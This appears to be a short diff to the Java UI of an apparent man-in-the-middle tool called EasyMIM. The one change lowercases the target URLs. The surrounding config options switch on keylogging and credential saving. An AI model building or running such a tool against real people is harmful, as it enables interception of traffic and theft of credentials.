@@ -150,7 +150,7 @@ public class EasyMIMUI {
 				}
 				EasyMIMConfig config = new EasyMIMConfig();
 				String urls = targetURLField.getText();
-				config.targetURL = new ArrayList<String>(Arrays.asList(urls.split(";")));
+				config.targetURL = new ArrayList<String>(Arrays.asList(urls.toLowerCase().split(";")));
 				config.imageURL = urlImageTextField.getText();
 				config.keylogger = isKeyLogging.isEnabled();
 				config.saveCred = isSaveCredential.isEnabled();
